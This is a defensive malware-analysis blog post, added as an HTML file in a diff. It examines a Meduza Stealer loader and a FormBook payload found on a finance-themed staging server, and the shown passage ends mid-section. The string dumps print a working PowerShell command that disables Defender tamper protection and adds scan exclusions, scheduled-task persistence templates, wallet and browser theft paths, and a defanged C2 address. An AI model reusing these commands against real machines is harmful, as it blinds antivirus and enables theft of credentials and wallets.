@@ -1,0 +1,758 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>A Finance Lure, a Meduza Loader, and an XWorm Port Nobody Had Reported — Ghost in the Bit</title>
+  <meta name="description" content="A hunt that began with two executables in an open directory and ended at a Meduza Stealer loader that switches off Defender, hides inside a Microsoft signed build tool, and phones a known XWorm operator on a port nobody had written down, packaged next to a FormBook payload. Static analysis, dynamic detonation, passive DNS pivots, fingerprints, hashes, and defanged indicators." />
+  <link rel="icon" type="image/x-icon" href="/images/favicons/favicon.ico" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicons/favicon-16x16.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicons/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="192x192" href="/images/favicons/favicon-192x192.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicons/apple-touch-icon.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  <meta name="theme-color" content="#0a0a0a" />
+  <link rel="stylesheet" href="/platform/styles/core.css" />
+  <style>
+    /* Report-specific additions, built from core.css tokens so it stays native */
+    .article figure { margin: var(--space-6) 0; }
+    .article figure img {
+      width: 100%;
+      border: 1px solid var(--border-soft);
+      border-radius: var(--radius-3);
+      background: var(--bg-2);
+    }
+    .article figcaption {
+      margin-top: var(--space-2);
+      font-size: 0.82rem;
+      color: var(--text-3);
+      text-align: center;
+    }
+    .key-list { list-style: none; padding: 0; margin: var(--space-4) 0; }
+    .key-list li {
+      position: relative;
+      padding: 10px 0 10px 22px;
+      border-bottom: 1px solid var(--border-soft);
+      color: var(--text-1);
+    }
+    .key-list li::before {
+      content: "";
+      position: absolute; left: 0; top: 17px;
+      width: 8px; height: 8px;
+      background: var(--accent);
+      transform: rotate(45deg);
+    }
+    .callout-note {
+      background: var(--bg-2);
+      border-left: 3px solid var(--accent);
+      border-radius: 0 var(--radius-2) var(--radius-2) 0;
+      padding: var(--space-3) var(--space-5);
+      margin: var(--space-5) 0;
+      color: var(--text-1);
+      font-size: 0.95rem;
+    }
+    .callout-note strong { color: var(--text-0); }
+    .veggie {
+      background: var(--bg-2);
+      border: 1px dashed var(--border-soft);
+      border-radius: var(--radius-3);
+      padding: var(--space-3) var(--space-5);
+      margin: var(--space-5) 0;
+      color: var(--text-1);
+      font-size: 0.93rem;
+    }
+    .veggie strong { color: var(--text-0); }
+    .ioc-block {
+      background: var(--code-bg);
+      border: 1px solid var(--code-border);
+      border-radius: var(--radius-3);
+      padding: var(--space-4) var(--space-5);
+      margin: var(--space-5) 0;
+      font-size: 0.85rem;
+    }
+    .ioc-block h4 { margin: 0 0 var(--space-2); color: var(--text-1); font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.04em; }
+    .ioc-block + .ioc-block { margin-top: calc(var(--space-5) * -0.4); }
+  </style>
+</head>
+<body>
+  <header class="site-header">
+    <a href="/" class="brand"><span class="brand-mark">◯</span><span class="brand-name">Ghost in the Bit</span></a>
+    <nav class="site-nav-inline" id="site-nav-inline"></nav>
+  </header>
+
+  <main class="article">
+    <header class="article-header">
+      <h1 class="article-title">A Finance Lure, a Meduza Loader, and an XWorm Port Nobody Had Reported</h1>
+      <div class="article-meta">
+        <span class="category-pill">threat hunting</span>
+        <span class="category-pill">malware analysis</span>
+        <time datetime="2026 06 29">June 29, 2026</time>
+        <span>Threat hunting</span>
+        <span>27 min read</span>
+      </div>
+    </header>
+
+    <div class="callout-note">
+      <strong>One note before we start.</strong> As usual, I am not a malware reverse engineer by trade. The part I am best at is the part that comes before the deep reversing, noticing something that does not sit right, pulling the thread slowly, and saying I am not sure when I am not sure. The two binaries below were pulled off the open directory through a disposable cloud server built for that one job and torn down right after, never to my own machine. Static analysis ran with no execution and no network, both samples were later detonated only inside VirusTotal's own sandboxing, never on anything of mine. I never touched the mail stack or any victim data, none was ever observed sitting on the host. Every IP, domain, and URL is defanged with square brackets.
+    </div>
+
+    <p>
+      I went looking for open directories serving built executables and found a finance themed hosting box with two binaries parked in the webroot. One of them turned out to be a native Windows infostealer and loader. It switches off Microsoft Defender, hides its real code inside a Microsoft signed build tool that ships with Windows, rifles through your browsers and crypto wallets, and then calls home to an IP that the abuse.ch crew already had on file as an XWorm panel. The fun part is the port. The panel on record answered on one port. This build dials a different one that nobody had written down anywhere.
+    </p>
+
+    <p>
+      So this is a small hunt with a clean spine. One staging box, one C2, two samples, and a stack of fingerprints that line up well enough to tell a story while leaving exactly one honest question open at the end. Along the way I am going to explain why a single number told me one of these files was packed before I read a single byte of its code, and why an empty search result was one of the more useful things I found all day.
+    </p>
+
+    <h2>The short version</h2>
+    <ul class="key-list">
+      <li>One staging host, <code>104.207.74[.]198</code> (AS22612, Namecheap, Los Angeles), a full cPanel and WHM box with a working mail stack and a finance lure domain, <code>capitaledgey[.]online</code>. Two executables sat in the open webroot on port 443.</li>
+      <li><code>Built_Stub.exe</code> is a native x64 loader and infostealer built with MSVC, unsigned. It disables Defender tamper protection, patches AMSI, injects code into <code>MSBuild.exe</code>, and steals browser logins, cookies, crypto wallets, Telegram, and Discord. It carries a hardcoded C2 of <code>38.240.51[.]74:7766</code>. Dynamic analysis identifies it as a Donut style in memory loader carrying Meduza Stealer.</li>
+      <li><code>bin.exe</code> is a fully packed payload. One section, no readable imports, entropy 7.99. It is the thing the loader stage decrypts and runs at runtime, and dynamic analysis identifies the unpacked payload as FormBook, also tracked as XLoader.</li>
+      <li>The C2 IP is already in ThreatFox as an XWorm botnet panel on port <code>7004</code> (reported June 22 by abuse_ch). This build adds port <code>7766</code> on the same host, which had not been reported anywhere.</li>
+      <li>Both sample hashes were absent from every feed I checked, so these are fresh builds. Passive DNS scoped the staging box to this one campaign and showed the C2 as a bare IP with no name ever attached to it.</li>
+      <li>I let both samples actually run in sandboxes once the static picture was solid. The loader's C2 connection is now confirmed live, not just a string sitting unused, and the run caught it checking the victim's country before doing anything else and quietly opening the cookie jar.</li>
+      <li>The packed payload turned out to be a nesting doll. Run on its own it does not just decrypt and sit there, it unpacks FormBook and runs it, on some runs dropping a fresh executable into a randomly named folder and on others injecting straight into a trusted Windows process. Both paths land on the same FormBook payload.</li>
+      <li>So the operation is running more than one commodity family off shared infrastructure: a Meduza loader that beacons to a known XWorm panel, packaged next to a FormBook payload. The early guess that the cargo was XWorm itself turned out to be wrong on both counts, which is the kind of thing dynamic analysis is for.</li>
+    </ul>
+
+    <h2>How I got here</h2>
+    <p>
+      Open directory hunting is exactly what it sounds like. A misconfigured web server hands out a plain listing of its own folders, the old <code>Index of /</code> page, and you go reading file names. Most of what you find is boring. Backup archives, somebody's photos, a forgotten WordPress install. The trick is to seed your search with words that builders use and victims never do. I throw terms like <code>loader</code>, <code>payload</code>, <code>stub</code>, and <code>inject</code> at the title field and see which servers proudly list a folder full of executables they should not be sharing with the entire internet.
+    </p>
+
+    <p>
+      That seeding landed me on <code>104.207.74[.]198</code>, serving a directory on port 443 that contained two files and a <code>cgi-bin</code> folder.
+    </p>
+
+    <pre><code>Index of /
+  Built_Stub.exe     2.0M
+  bin.exe            280K
+  cgi-bin/</code></pre>
+
+    <p>
+      The TLS certificate on that port was issued to <code>mail.capitaledgey[.]online</code> and <code>server.capitaledgey[.]online</code>, a Let's Encrypt domain validated cert. A finance flavored domain name, a webroot whose only real content is two compiled programs, and a certificate quietly themed to match. None of that is proof of anything yet. A file name is a label, not evidence. So I held the verdict at suspected and pulled the full host profile to see what kind of box this was.
+    </p>
+
+    <pre><code>104.207.74[.]198   AS22612  Namecheap  Los Angeles
+  21    pure-ftpd
+  22    OpenSSH
+  25    Exim smtpd
+  53    PowerDNS
+  80    Apache
+  110   Dovecot pop3
+  143   Dovecot imap
+  443   Apache (open directory, Built_Stub.exe + bin.exe)
+  587   Exim submission
+  993   Dovecot imaps
+  2077  cpsrvd  (WHM)
+  2078  cpsrvd  (WHM ssl)
+  2082  cpsrvd  (cPanel)
+  2083  cpsrvd  (cPanel ssl)
+  2086  cpsrvd  (WHM)
+  2087  cpsrvd  (WHM ssl)
+  2095  cpsrvd  (Webmail)
+  2096  cpsrvd  (Webmail ssl, Roundcube)</code></pre>
+
+    <p>
+      This is a complete cPanel and WHM hosting box with a live mail stack. Exim for sending, Dovecot for mailboxes, Roundcube webmail, PowerDNS for the zone. That profile reads like a phishing and business email compromise operation rather than a compromised store front. A finance lure to make the emails believable, a working mail server to send them from, and malware staged in plain sight in the public web folder. The pieces fit, but I still had not opened the files. Time to fix that.
+    </p>
+
+    <h2>Meet the two files</h2>
+    <p>
+      First pass is always identity. What are these things, and what are their hashes so I have anchors to pivot on later.
+    </p>
+
+    <pre><code>==== Built_Stub.exe ====
+2,106,368 bytes
+PE32+ executable (GUI) x86-64, 7 sections
+MD5     b101e26ffbc726c750eb2e517d08e3aa
+SHA1    4a47ddfc25a587cfb1ad9acca0092c0e12d860b0
+SHA256  6cd0e8316913a3fd7aed556811b5ab00bf9ea5271abee16152b577002256113f
+
+==== bin.exe ====
+286,208 bytes
+PE32 executable (GUI) Intel 80386
+MD5     40a8dee1f6886af16926fdf8c001e2c4
+SHA1    d1370cc390d4b75370f55e633c0d981a41de30a8
+SHA256  e3cf3fa76253ae8ecbd18344659be1d1bddde9469f99bb00e8c8295db2d338fb</code></pre>
+
+    <p>
+      One x64 file around two megabytes, one x86 file around a quarter of that. Different shapes already. The container here did not have the usual analysis libraries installed and had no network, so I parsed the PE format by hand in Python and used the standard string and hashing tools. Old fashioned, but it keeps you honest about what you are actually reading.
+    </p>
+
+    <h2>Reading the bones of Built_Stub.exe</h2>
+    <p>
+      Every Windows program is divided into sections, named slabs of the file that hold code, constants, data, and so on. A quick way to smell trouble is to measure the randomness of each section. That randomness has a real name and a real number behind it, and it is worth thirty seconds to understand because it does most of the heavy lifting in this whole post.
+    </p>
+
+    <div class="veggie">
+      <strong>The one number that gives packers away.</strong> Entropy measures how surprising the next byte is. Plain English text is predictable, so you can often guess the next letter, and it scores low, around 4.5 on a scale that tops out at 8. Normal compiled code is a bit busier and sits near 6. Now picture old television static, where every dot is equally likely and nothing is predictable. Compressed and encrypted data looks exactly like that to a computer, every byte roughly as likely as any other, and it scores close to 8. So when a section measures 7.99, it is screaming that whatever is in there has been squeezed or scrambled into noise. Hold that thought.
+    </div>
+
+    <pre><code>Built_Stub.exe   machine=0x8664   sections=7   timestamp=2026-04-03T13:37:08
+  .text     vsz=0x1a135f  rawsz=0x1a1400  entropy=6.45
+  .rdata    vsz=0x49196   rawsz=0x49200   entropy=5.81
+  .data     vsz=0x356914  rawsz=0x5a00    entropy=1.99
+  .pdata    vsz=0xeebc    rawsz=0xf000    entropy=6.19
+  .fptable  vsz=0x100     rawsz=0x200     entropy=0.00
+  .rsrc     vsz=0x123c    rawsz=0x1400    entropy=1.84
+  .reloc    vsz=0x18a8    rawsz=0x1a00    entropy=5.38
+  .NET (COM directory) -> native
+  Authenticode -> UNSIGNED</code></pre>
+
+    <p>
+      The code section sits at 6.45, the relaxed number for honest compiled code, so this file is not itself packed. Three things in that table earned a note. The <code>.data</code> section claims about 3.5 megabytes of space in memory but only takes 23 kilobytes on disk, which is the signature of a buffer a program reserves at launch to unpack something into. The <code>.fptable</code> section had me reaching for a Nim or Go theory for a minute, then the compiler marker settled it as a plain Microsoft C runtime artifact, so I dropped the theory rather than dress it up. And the compile timestamp reads <code>13:37:08</code>, the old keyboard spelling of leet, a wink from whoever pressed build. It changes nothing about detection. It just tells you a person with a sense of humor was at the keyboard.
+    </p>
+
+    <p>
+      One more line in that output deserves a quick aside, because it decides what this file can and cannot be.
+    </p>
+
+    <div class="veggie">
+      <strong>Native code versus .NET, in one header field.</strong> Every Windows executable carries a little table of contents in its header, a row of slots pointing at optional features. One slot is reserved for .NET. If that slot is empty, the program is raw machine code that the CPU runs directly. If it points somewhere, the program is a .NET assembly that runs on Microsoft's managed runtime. XWorm is written in .NET. The loader's .NET slot is empty, so the loader is native code. That single field already tells you the loader is a different creature from XWorm, even though, as you will see, it serves an XWorm panel. Keep that filed away for the attribution section.
+    </div>
+
+    <h2>What the loader is built to do</h2>
+    <p>
+      A program announces a lot of its intentions through the Windows functions it imports. Here is the notable set, grouped by the library they come from. Read it like a job description.
+    </p>
+
+    <pre><code>KERNEL32   VirtualAlloc, VirtualAllocEx, VirtualProtect, VirtualProtectEx,
+           WriteProcessMemory, CreateRemoteThread, QueueUserAPC, ResumeThread,
+           CreateProcessA, CreateProcessW, CreateMutexA, CreateMutexW, IsDebuggerPresent
+bcrypt     BCryptOpenAlgorithmProvider, BCryptGenerateSymmetricKey, BCryptSetProperty,
+           BCryptDecrypt, BCryptDestroyKey, BCryptCloseAlgorithmProvider
+CRYPT32    CryptUnprotectData, CryptStringToBinaryA, CryptQueryObject, CryptMsgGetParam
+ADVAPI32   AdjustTokenPrivileges, OpenProcessToken, RegCreateKeyExA, RegSetValueExA, RegSetValueExW
+WINHTTP    WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpReadData
+WININET    InternetOpenA, InternetOpenUrlA
+WINTRUST   WinVerifyTrust
+WTSAPI32   WTSEnumerateSessionsW
+IPHLPAPI   GetAdaptersAddresses</code></pre>
+
+    <p>
+      That top block is a textbook process injection kit. A short explainer earns its place here because injection is the move this whole sample is built around.
+    </p>
+
+    <div class="veggie">
+      <strong>Process injection, the polite version.</strong> Think of a running program as an apartment with its own locked rooms. <code>VirtualAllocEx</code> rents an empty room inside someone else's apartment. <code>WriteProcessMemory</code> moves your furniture into that room. <code>CreateRemoteThread</code> or <code>QueueUserAPC</code> flips the light switch and the code starts running. The payoff is identity theft at the process level. Your code is now executing while wearing the host program's name and reputation, which is far quieter than running an unknown executable of your own.
+    </div>
+
+    <p>
+      The <code>bcrypt</code> set is an AES decryption routine, and <code>CryptStringToBinaryA</code> is a base64 decoder. Together they are the machinery for taking an encrypted, base64 wrapped blob and turning it back into a runnable program. Remember the file next door with entropy 7.99. The <code>CRYPT32</code> line is where it stops being abstract, because <code>CryptUnprotectData</code> is the function that quietly unlocks your saved browser secrets.
+    </p>
+
+    <div class="veggie">
+      <strong>Why DPAPI is the stealer's favorite door.</strong> Windows gives apps a vault to encrypt small secrets tied to your login, called DPAPI. Browsers use it to protect your saved passwords and the key that decrypts your cookies. The catch built into the design is that any code running as you can ask the vault to hand those secrets straight back, no extra password required. The stealer does not crack anything. It just asks politely with <code>CryptUnprotectData</code>, and because it is running as you, the vault obliges.
+    </div>
+
+    <p>
+      The cleartext strings fill in the rest of the job description, and there is no comfortable way to read them.
+    </p>
+
+    <pre><code>%s\Login Data
+%s\Cookies
+%s\Local State
+%s\Network\Cookies
+%s\EBWebView\Default\Network\Cookies
+%s\cookies.sqlite
+%s\nss3.dll
+%s\mozglue.dll
+%s\inj_%u.dll
+Exodus\exodus.wallet
+Electrum\wallets
+Monero\wallets
+Coinomi\Coinomi\wallets
+Atomic Wallet.exe
+ejbalbakoplchlghecdalmeeeajnimhm     (Coinbase Wallet browser extension)
+nkddgncdjgjfcddamfgcmfnlhccnimig     (OKX browser extension)
+Messengers/Telegram/tdata
+/api/v9/users/@me                    (Discord token check)
+/api/v1/browser/profiles             (antidetect browser profiles)
+COMPILER=msvc-1944</code></pre>
+
+    <p>
+      Chromium credential and cookie theft through <code>Login Data</code>, <code>Cookies</code>, and the <code>Local State</code> key file, decrypted with the DPAPI call above. Firefox through its NSS libraries <code>nss3.dll</code> and <code>mozglue.dll</code> and the <code>cookies.sqlite</code> store. Edge through its <code>EBWebView</code> path. A long list of desktop crypto wallets plus two browser extension IDs that decode to Coinbase Wallet and OKX. Telegram session theft through the <code>tdata</code> folder. A Discord token check against <code>/api/v9/users/@me</code>. Even antidetect browsers, the privacy tools fraud crews use to juggle fake identities, get scraped through their local profile API. The <code>COMPILER=msvc-1944</code> marker pins the toolchain to MSVC 19.44, the Visual Studio 2022 era, which confirms native C and C++ and explains that <code>.fptable</code> section as a runtime artifact rather than anything exotic.
+    </p>
+
+    <h2>The part where it turns off your alarm</h2>
+    <p>
+      A focused pass for configuration, persistence, and a C2 brought up the strings that move this from nasty to unambiguous.
+    </p>
+
+    <pre><code>%s Build %lu
+.paypal[.]com
+.microsoftonline[.]com
+.discord[.]com
+.google[.]com
+.netflix[.]com
+127.0.0[.]1
+38.240.51[.]74:7766
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
+MSBuild.exe
+MUTEX_W32
+C:\Windows\System32\Amsi.dll
+C:\Windows\SysWow64\Amsi.dll
+cmd.exe /c taskkill /IM Atomic Wallet.exe /F & "%s\Programs\Atomic Wallet\Atomic Wallet.exe"
+powershell.exe -ExecutionPolicy Bypass -NoProfile -NoLogo -NonInteractive -WindowStyle Hidden -Command "try { Set-MpPreference -DisableTamperProtection $true -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\' -Force -ErrorAction Stop; Add-MpPreference -ExclusionProcess @('powershell.exe','cmd.exe','conhost.exe','MSBuild.exe') -Force -ErrorAction Stop; exit 0 } catch { exit 1 }"
+time.google[.]com
+time.windows[.]com
+time.cloudflare[.]com</code></pre>
+
+    <p>
+      That PowerShell one liner is the moment the benign reading dies for good. It runs <code>Set-MpPreference -DisableTamperProtection $true</code>, which reaches into Microsoft Defender and switches off the very feature that exists to stop tampering. Then it whitelists the whole <code>C:\</code> drive and excuses <code>powershell</code>, <code>cmd</code>, <code>conhost</code>, and <code>MSBuild</code> from scanning. Legitimate software does not disable Defender's tamper protection. Nothing does that for a good reason.
+    </p>
+
+    <p>
+      Two hardcoded paths to <code>Amsi.dll</code> point at the next trick, and it is worth a beat to explain because it is one of the most common evasions in modern Windows malware.
+    </p>
+
+    <div class="veggie">
+      <strong>AMSI, and how malware blinds it.</strong> Windows gives antivirus a hook called AMSI that lets a scanner read a script or a memory buffer in the split second before it runs, even if that script was decrypted only moments earlier. It is the reason fileless attacks are not free. Malware that loads <code>Amsi.dll</code> and patches it in memory is reaching up and putting tape over the camera lens. The scanner still thinks it is watching. It just no longer sees anything.
+    </div>
+
+    <p>
+      Then there is the choice of injection target. Those two <code>MSBuild.exe</code> paths are not an accident, and the reason is the whole point of living off the land.
+    </p>
+
+    <div class="veggie">
+      <strong>Living off the land, starring MSBuild.</strong> MSBuild is Microsoft's build engine, and it ships inside Windows already signed by Microsoft, which means most defenses trust it on sight. Hollow your malicious code into an MSBuild process and the bad thread is now running under a signed, expected, Microsoft branded name. Borrowing the operating system's own trusted tools to do the dirty work is what defenders politely call living off the land. The attacker brings less of their own suspicious baggage, so there is less for anyone to catch.
+    </div>
+
+    <p>
+      The rest of the block rounds out the behavior. The malware kills and relaunches Atomic Wallet so it can catch the wallet fresh at startup. It uses scheduled tasks for persistence, masquerades a shortcut as <code>WindowsUpdate.lnk</code>, and writes a Run key. It guards itself with <code>IsDebuggerPresent</code> and <code>WinVerifyTrust</code> and a mutex named <code>MUTEX_W32</code> so only one copy runs at a time. The three <code>time.*</code> domains are real network time servers, used here as a sandbox timing check rather than anything sinister on their own. The brand list, PayPal and Microsoft Online and Discord and the rest, is the cookie targeting set, the accounts worth stealing a live session for.
+    </p>
+
+    <pre><code>WindowsUpdate.lnk
+schtasks /create /tn "%s" /xml "%s"
+schtasks.exe /create /tn "%s" /tr "%s%s%s" /sc %s%s%s /f
+schtasks.exe /run /tn "%s"
+&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;</code></pre>
+
+    <p>
+      And buried in the same block, the address that ties this sample to a name you may already know.
+    </p>
+
+    <pre><code>38.240.51[.]74:7766</code></pre>
+
+    <h2>The file that would not talk: bin.exe</h2>
+    <p>
+      Now back to the smaller file, and the number from earlier pays off.
+    </p>
+
+    <pre><code>bin.exe   machine=0x14c   sections=1
+  .text   vsz=0x44e00  rawsz=0x44e00  entropy=7.99
+  import directory -> none (packed)
+  .NET (COM directory) -> native (outer shell)</code></pre>
+
+    <p>
+      One section. No import table at all, which means none of the usual job description is readable. And entropy at 7.99, the television static number. A normal program tells you which Windows functions it needs so the system can wire them up at launch. This one tells you nothing, because its real body has been encrypted into noise and only a thin native stub on the outside is readable. That shape, a single high entropy section with the imports hidden inside the blob, is precisely what the AES and base64 routines in <code>Built_Stub.exe</code> are built to reverse at runtime. The loader carries the key. The packed file carries the cargo.
+    </p>
+
+    <p>
+      I could go no further on <code>bin.exe</code> by static means without the key the stub derives, and I was not going to detonate it on my own machine. So I wrote down the honest version: the loader and the packed payload are a matched set, a crypter style stub plus the cargo it unpacks and runs. At this point I had a guess about what the cargo was, and I will admit upfront that the guess turned out to be wrong. The only way to know for sure was to let it run and watch what came out, which is exactly what I did next.
+    </p>
+
+    <h2>What happens when you actually let them run</h2>
+    <p>
+      Everything up to this point came from reading the files cold, no execution, just bytes and structure. Static analysis tells you what a program is capable of. It does not always tell you which of those capabilities it actually uses, or what order they fire in. So once the picture above felt solid, I detonated both samples in automated sandbox environments and watched what each one actually does rather than just what it could do. (A note on which sandboxes, and how much they disagreed with each other, is at the very end.)
+    </p>
+
+    <div class="veggie">
+      <strong>Why bother running it if you already read the code.</strong> Reading a program tells you every door it knows how to open. Watching it run tells you which doors it actually walks through, in what order, and what is standing behind them. A loader might import forty dangerous functions and only call three of them on a given run. The strings might list thirty wallet paths and only two actually get touched because that is all the test machine had installed. Static analysis is the blueprint. Dynamic analysis is watching someone actually walk through the building.
+    </div>
+
+    <p><strong>Built_Stub.exe, caught in the act.</strong> The sandbox network trace shows an outbound TCP connection to <code>38.240.51[.]74:7766</code> fired during the run. That hardcoded address from the strings dump was not just sitting there for show, it is a live connection the malware actually makes the moment it gets a chance.</p>
+
+    <p>
+      Running the loader also put a name on it, which static analysis alone had not let me do with any confidence. The signatures that fired identify it as Meduza Stealer, delivered by a Donut style in memory loader. That second half is worth pausing on, because it is the exact mechanism I had reconstructed by hand from the bytes without knowing its name. Donut is an open source toolkit that turns a normal program into position independent shellcode so it can be run entirely from memory, resolving the Windows functions it needs on the fly and never writing a clean copy of itself to disk. The PEB walking, the missing import table, the unpack that only ever happens in RAM, all the things I described in the static section, that is Donut. So the loader is Meduza wrapped in Donut, and every stealer capability I read out of the strings, the wallets, the browser theft, the AMSI patch, the public IP check, the screenshot grab, lit up live under that name.
+    </p>
+
+    <p>Before any of the theft routines kick in, the very first thing it does on the network is ask a third party where in the world it is.</p>
+
+    <pre><code>GET http://ip-api[.]com/line/?fields=countryCode
+User-Agent: Mozilla/5.0
+Response: 200, 3 bytes (a two letter country code)</code></pre>
+
+    <div class="veggie">
+      <strong>Why malware checks your country before it checks your wallet.</strong> A two letter country code costs the operator almost nothing to ask for and tells them a lot. Some crews skip certain countries entirely to dodge legal heat where they live. Others use it to decide which language to show a fake error in, or which payment apps are even worth stealing from in that region. Either way, the malware is sorting you into a bucket before it decides whether you are worth the rest of its trouble. A piece of legitimate software has no reason to silently ask a third party API where in the world you are before doing its actual job, and two separate community rule sets caught it independently, an ET signature built specifically for external IP lookup domains and a Sigma rule that watches for IP geolocation APIs being called by a process that is not a browser.
+    </div>
+
+    <p>
+      The full traffic list from that run is short enough to walk through end to end, and it is worth doing once, because not every connection a sandbox logs is something worth chasing.
+    </p>
+
+    <pre><code>TCP 38.240.51[.]74:7766        the C2
+TCP 208.95.112[.]1:80          ip-api[.]com   (the geofencing call above)
+DNS  time.windows[.]com -&gt; 168.61.215[.]74
+UDP  8.8.8[.]8:53              DNS resolver
+UDP  162.159.36[.]2:53         DNS resolver (Cloudflare)</code></pre>
+
+    <p>
+      Four of those five destinations are dead ends on purpose, and knowing that early saves you from chasing infrastructure that has nothing to do with the operator. <code>ip-api[.]com</code> is a free geolocation service rented for one request by thousands of unrelated pieces of software. <code>time.windows[.]com</code> is Microsoft's own time server, and seeing it actually resolve here confirms the timing check spotted earlier in the strings dump genuinely fired during the run rather than sitting unused. The two DNS hops are just how the sandbox machine looked those names up, Google's public resolver and a Cloudflare one, neither chosen by the operator. Pivoting on any of those four would only turn up every other piece of software that happens to ask the time or check its own IP. The one address worth a second look is the one already carrying the weight of this whole piece.
+    </p>
+
+    <p>
+      Past that check, the cookie and credential theft routine actually fired. The run shows it opening the local cookie and history stores, <code>INetCookies</code>, the legacy <code>Temporary Internet Files</code> cache, and the matching WinINet registry keys. Worth a small caveat here, the sandbox machine only had the built in legacy cookie jar to work with, no real Chrome or Firefox installed, so what fired in this particular run was the system default fallback path rather than the Chromium specific routine from the static strings. The behavior is real, it just did not have its preferred target on this particular machine.
+    </p>
+
+    <p>
+      One more thing surfaced that explains how this stays believable to a victim while it works in the background.
+    </p>
+
+    <pre><code>Highlighted text: "Optional update delivery is not working"</code></pre>
+
+    <p>
+      That reads like a fake Windows Update error, the kind of small, boring, easy to dismiss message that gives someone a reason to shrug and walk away from their computer instead of getting suspicious. The lure email gets someone to open the file. This decoy buys the malware a few extra quiet minutes once it is already running.
+    </p>
+
+    <p>
+      Last thing worth flagging from this run, and I want to be careful with how much weight I put on it. Buried in memory, the sandbox caught a reference to a real, legitimate file:
+    </p>
+
+    <pre><code>https://www.amyuni[.]com/downloads/usbmmidd_v2.zip</code></pre>
+
+    <div class="veggie">
+      <strong>A virtual monitor is a strange thing for a stealer to want.</strong> That URL points at a real driver, a virtual USB multi monitor tool that creates a fake display Windows thinks is a real second screen. It has a legitimate use in testing software on machines with no actual second monitor attached. It also has a well known second life, hidden remote control tools use it to give an attacker a screen to drive that the person sitting at the keyboard never sees, no flickering window, no obvious sign anything is happening. Seeing that reference in memory is not proof this build actually downloads or uses it, I never saw an outbound request for it in this run, so I am flagging it as a loose thread rather than a confirmed capability. But it is exactly the kind of thread worth somebody pulling on later.
+    </div>
+
+    <p><strong>bin.exe, and what was actually inside it.</strong> This is where the picture genuinely changed, and where my earlier guess fell apart in a useful way. I had treated <code>bin.exe</code> as a packed XWorm client. Running it told a different story.</p>
+
+    <pre><code>Branch 1 (drop):
+  bin.exe
+   └── C:\Program Files (x86)\<random>\<random>.exe   (e.g. zIw5oso6us.exe)
+  Mutex: K620NR6-VEXECB0C
+
+Branch 2 (inject):
+  bin.exe
+   └── ftp.exe  (C:\Windows\SysWOW64\ftp.exe, hollowed)
+        └── theft routines run from inside the trusted process</code></pre>
+
+    <p>
+      <code>bin.exe</code> behaved differently depending on the machine it landed on, which is itself a finding. On some runs it dropped a brand new executable into a folder with a long randomly generated name under Program Files (x86) and launched it with its own mutex, <code>K620NR6-VEXECB0C</code>, separate from the loader's <code>MUTEX_W32</code>. On other runs it skipped the dropped file entirely and injected straight into a trusted, signed Windows program, the FTP client <code>ftp.exe</code>, then drove the theft from inside that borrowed process. Two roads, and as it turned out, the same destination.
+    </p>
+
+    <p>
+      Because here is what finally came out once the payload fully unpacked in memory: it is FormBook, the long running commodity stealer also tracked under the name XLoader. The identification is not a lucky single hit, it is the unpacked code matching known FormBook signatures, the family's distinctive habit of hollowing itself into a legitimate Windows binary, and the harvested data getting staged into a local database for exfil. The packed blob behind the 7.99 entropy wall was FormBook the whole time.
+    </p>
+
+    <div class="veggie">
+      <strong>Why injecting into ftp.exe is the same trick as the loader's MSBuild move.</strong> FormBook does not like to run as itself. It carves its code into a normal, Microsoft signed Windows program, here the built in FTP client, so that to any quick inspection it is <code>ftp.exe</code> doing the work, not unknown malware. That is the exact same living off the land logic the loader used one layer up when it chose <code>MSBuild.exe</code>. Two different families in this operation, the same instinct: wear a trusted process like a coat.
+    </div>
+
+    <p>
+      And here is the detail that locks the division of labor in place. The packed payload never contacts <code>38.240.51[.]74:7766</code> itself. The only network noise it generated on its own was ordinary Microsoft and CDN traffic with nothing to do with the operation. So the C2 conversation belongs entirely to <code>Built_Stub.exe</code>, while the packed file's job is narrower: unpack FormBook, get it running inside something trusted, and let the loader own the panel.
+    </p>
+
+    <div class="veggie">
+      <strong>Nesting dolls, and what was inside.</strong> I started this hunt picturing a two layer sandwich, a loader on the outside, one packed payload as the filling. What actually came out is closer to a set of nesting dolls, each layer's only job being to open the next one quietly. And when the last doll finally opened, the thing inside was not the XWorm client I had guessed at. It was FormBook. The loader phones a known XWorm panel, but the cargo it ships next to is a different family entirely, which is a more interesting result than a tidy single attribution would have been.
+    </div>
+
+    <p>
+      Worth saying plainly, because I guessed wrong earlier and would rather mark it than bury it: I spent the static phase treating the packed file as a likely XWorm client, on the logic that a packed payload sitting next to an XWorm associated loader was probably more XWorm. Running it proved that wrong. The cargo is FormBook. The only thing tying this operation to XWorm is the shared C2 panel, not the payloads themselves, and that distinction matters for anyone trying to track the actors behind it.
+    </p>
+
+    <h2>What the feeds already knew</h2>
+    <p>
+      With hashes and a C2 in hand, I checked the public feeds. The results split cleanly.
+    </p>
+
+    <p>
+      Both sample hashes came back empty across VirusTotal, MalwareBazaar, and ThreatFox. Nobody had seen <code>Built_Stub.exe</code> or <code>bin.exe</code>. Fresh builds, not yet catalogued. The lure domain <code>capitaledgey[.]online</code> was equally absent, with generic search only turning up unrelated legitimate finance brands that the name is quietly squatting on.
+    </p>
+
+    <p>
+      The C2 IP was a different story.
+    </p>
+
+    <pre><code>38.240.51[.]74    AS931 (Censys) / AS213122 (ThreatFox)   HYONIX / Krixe Pte. Ltd.
+  VirusTotal      15 / 91 vendors flag malicious
+  ThreatFox       38.240.51[.]74:7004   XWorm   botnet_cc
+                  first seen 2026-06-22  reporter abuse_ch
+                  reference sample e2fa1f0b6df7ca036edab2d3c9ae4990ab2898c7a25c1cf0a0326bc5b45d4fa6</code></pre>
+
+    <p>
